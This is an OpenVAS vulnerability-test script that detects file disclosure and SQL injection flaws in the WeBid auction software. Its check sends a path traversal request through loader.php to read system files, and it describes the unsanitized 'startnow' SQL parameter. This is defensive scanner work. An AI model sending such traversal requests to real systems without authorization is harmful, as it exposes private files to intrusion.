###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_webid_file_disc_n_sql_vuln.nasl 7577 2017-10-26 10:41:56Z cfischer $
#
# WeBid Local File Disclosure and SQL Injection Vulnerabilities
#
# Authors:
# Arun Kallavi <karun@secpod.com>
#
# Copyright:
# Copyright (c) 2013 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_impact = "Successful exploitation could allow attackers to perform file
disclosure attacks and read arbitrary files on the affected application or
perform SQL injection and compromise the application.

Impact Level: Application";

tag_affected = "WeBid version 1.0.6 and prior";

tag_insight = "The flaws are due to improper input validation
- Input passed via the 'js' parameter to loader.php, allows attackers to
read arbitrary files.
- $_POST['startnow'] is directly used in mysql query without sanitization
in yourauctions_p.php.";

tag_solution = "No solution or patch was made available for at least one year
since disclosure of this vulnerability. Likely none will be provided anymore.
General solution options are to upgrade to a newer release, disable respective
features, remove the product or replace the product by another one.";

tag_summary = "This host is running WeBid and is prone to file disclosure and
SQL Injection vulnerability.";

SCRIPT_OID  = "1.3.6.1.4.1.25623.1.0.803399";
CPE = "cpe:/a:webidsupport:webid";

if(description)
{
  script_oid(SCRIPT_OID);
  script_version("$Revision: 7577 $");
  script_tag(name:"cvss_base", value:"6.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"$Date: 2017-10-26 12:41:56 +0200 (Thu, 26 Oct 2017) $");
  script_tag(name:"creation_date", value:"2013-05-09 17:11:32 +0530 (Thu, 09 May 2013)");
  script_name("WeBid Local File Disclosure and SQL Injection Vulnerabilities");
  script_xref(name : "URL" , value : "http://1337day.com/exploit/20730");
  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/25249");
  script_xref(name : "URL" , value : "http://exploitsdownload.com/exploit/na/webid-106-file-disclosure-sql-injection");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_copyright("Copyright (c) 2013 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_webid_detect.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("webid/installed");
  script_tag(name : "impact" , value : tag_impact);
  script_tag(name : "affected" , value : tag_affected);
  script_tag(name : "insight" , value : tag_insight);
  script_tag(name : "solution" , value : tag_solution);
  script_tag(name : "summary" , value : tag_summary);
  script_tag(name:"solution_type", value:"WillNotFix");
  exit(0);
}

include("misc_func.inc");
include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");

## Get HTTP Port
if(!port = get_app_port(cpe:CPE, nvt:SCRIPT_OID)){
  port = 80;
}

## Check port status
if(!get_port_state(port))exit(0);

## Get Installed Location
if(!dir = get_app_location(cpe:CPE, nvt:SCRIPT_OID, port:port))exit(0);

## traversal_files() function Returns Dictionary (i.e key value pair)
## Get Content to be checked and file to be check
files = traversal_files();

foreach file (keys(files))
{
  ## Construct directory traversal attack
  url = dir + "/loader.php?js=" + files[file];

  ## Confirm exploit worked properly or not
  if(http_vuln_check(port:port, url:url, pattern:file))
  {
    security_message(port);
    exit(0);
  }
}
